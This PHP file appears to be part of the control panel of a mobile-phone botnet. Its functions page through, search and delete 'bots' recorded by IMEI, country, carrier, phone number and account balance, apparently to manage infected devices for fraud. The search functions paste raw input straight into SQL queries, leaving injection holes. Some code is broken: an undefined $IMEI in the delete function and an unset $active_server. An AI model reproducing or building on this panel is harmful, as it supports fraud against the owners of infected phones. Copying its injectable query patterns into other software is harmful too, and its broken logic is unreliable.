<?php
date_default_timezone_set('Europe/Moscow');
function delete_bots($db)
{
$query = mysql_query("SELECT * FROM `list` where IMEI = '".$IMEI."'");

if ($delete = (int)$_REQUEST["delete_bot"])
    {
       $query_2 = mysql_query("DELETE FROM list WHERE IMEI='$IMEI'", $db) or die(mysql_error()); 
    }	
	
}

function select_bots($page, $db)
{
	if ($page == 1)
	{
		$n = 0;
	}
	else
	{
		$page = $page - 1;
		$n = $page * 50;
	}
	$query = mysql_query("SELECT * FROM list ORDER BY date DESC LIMIT $n, 50", $db) or die(mysql_error());


while ($queryrow = mysql_fetch_array($query))
	{
		$date = $queryrow['date'];
		$country = $queryrow['country'];
		$last_active = $queryrow['last_active'];
		$IMEI = $queryrow['IMEI'];
		$balance = $queryrow['balance'];
		$operator = $queryrow['operator'];


		$query_2 = mysql_query("SELECT * FROM countries WHERE iso1_code='$country' LIMIT 1", $db) or die(mysql_error());
		$queryrow_2 = mysql_fetch_array($query_2);
		
		if ($queryrow_2['name'] == FALSE)
		{
			$country = "Unknown";
		}
		else
		{
			$country = $queryrow_2['name'];
		}
		$last_active = date("d.m.Y H:i", (strtotime($last_active)));
		$date = date("d.m.Y H:i", (strtotime($date)));
		$country_flag = "<img width='30' src='images/flags/".$country.".png'>";


		$mess .= <<<HERE
			    <tr>
				        <td align='center'>{$date}</td>
				        <td align='center'>{$country}</td>
				        <td align='center'>{$last_active}</td>
				        <td align='center'>{$IMEI}</td>
				        <td align='center'>{$operator}</td>
				        <td align='center'>{$balance}</td>
				        <td align='center'>{$active_server}</td>						
			    </tr>
HERE;

	}

	return $mess;
	
}


function search_bots($search_date, $search_country, $search_phone, $search_IMEI, $search_operator, $search_balance ,$db)
{

	if ($search_date == TRUE)
{
	$search = $search_date;
	if (strlen($search) > 10)
	{
		$date = date("Y-m-d H:i%", (strtotime($search)));
	}
	else
	{
		$date = date("%Y-m-d%", (strtotime($search)));
	}
		$query = mysql_query("SELECT * FROM list WHERE CONCAT(date) LIKE '$date'", $db) or die(mysql_error());
}
elseif ($search_country == TRUE)
{
	$search = $search_country;
	$search = "%".$search."%";
	$query_3 = mysql_query("SELECT * FROM countries WHERE CONCAT(name) LIKE '$search' LIMIT 1", $db) or die(mysql_error());
	$queryrow_3 = mysql_fetch_array($query_3);
	$search = "%".$queryrow_3['iso1_code']."%";
	$query = mysql_query("SELECT * FROM list WHERE CONCAT(country) LIKE '$search'", $db) or die(mysql_error());
}
elseif ($search_phone == TRUE)
{
	$search = $search_phone;
	$search = "%".$search."%";
	$query = mysql_query("SELECT * FROM list WHERE CONCAT(phone) LIKE '$search'", $db) or die(mysql_error());
}
elseif ($search_IMEI == TRUE)
{
	$search = $search_IMEI;
	$search = "%".$search."%";
	$query = mysql_query("SELECT * FROM list WHERE CONCAT(IMEI) LIKE '$search'", $db) or die(mysql_error());
}
elseif ($search_operator == TRUE)
{
	$search = $search_operator;
	$search = "%".$search."%";
	$query = mysql_query("SELECT * FROM list WHERE CONCAT(operator) LIKE '$search'", $db) or die(mysql_error());
}
elseif ($search_balance == TRUE)
{
	$search = $search_balance;
	$query = mysql_query("SELECT * FROM list WHERE balance='$search'", $db) or die(mysql_error());
}


while ($queryrow = mysql_fetch_array($query))
	{
		$date = $queryrow['date'];
		$country = $queryrow['country'];
		$last_active = $queryrow['last_active'];
		$IMEI = $queryrow['IMEI'];
		$balance = $queryrow['balance'];
		$operator = $queryrow['operator'];


		$query_2 = mysql_query("SELECT * FROM countries WHERE iso1_code='$country' LIMIT 1", $db) or die(mysql_error());
		$queryrow_2 = mysql_fetch_array($query_2);
		$country = $queryrow_2['name'];

		$date = date("d.m.Y H:i", (strtotime($date)));
		$country_flag = "<img width='30' src='images/flags/".$country.".png'>";


		$mess .= <<<HERE
			    <tr>
				        <td align='center'>{$date}</td>
				        <td align='center'>{$country}</td>
				        <td align='center'>{$last_active}</td>
				        <td align='center'>{$IMEI}</td>
				        <td align='center'>{$operator}</td>
				        <td align='center'>{$balance}</td>
				        <td align='center'>{$active_server}</td>						
			    </tr>
HERE;

	}

	return $mess;
	
}

?>